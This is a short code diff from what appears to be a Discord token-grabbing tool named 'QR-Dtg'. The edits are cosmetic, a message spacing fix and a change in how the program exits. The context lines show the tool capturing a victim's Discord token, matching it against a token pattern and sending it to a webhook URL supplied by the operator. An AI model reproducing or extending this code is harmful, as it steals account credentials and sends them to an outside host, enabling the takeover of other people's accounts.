@@ -97,7 +97,7 @@ def main(webhook_url) -> None:
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
     Write.Print(f"\n\n[?] Token grabbed: {token}", Colors.rainbow)
     if webhook_url != None:
-        Write.Print("\n\n[!]Fetching token data...", Colors.red_to_purple)
+        Write.Print("\n\n[!] Fetching token data...", Colors.red_to_purple)
         webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
         embed = DiscordEmbed(color='88c800')
         if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
@@ -157,7 +157,7 @@ if __name__ == "__main__":
     elif confir == 'n':
         th_main = Thread(target=main, args=(None,))
     else:
-        sys.exit()
+        os._exit(0)
     Thread(target=pystray_icon).start()
     th_main.start()
     while True:
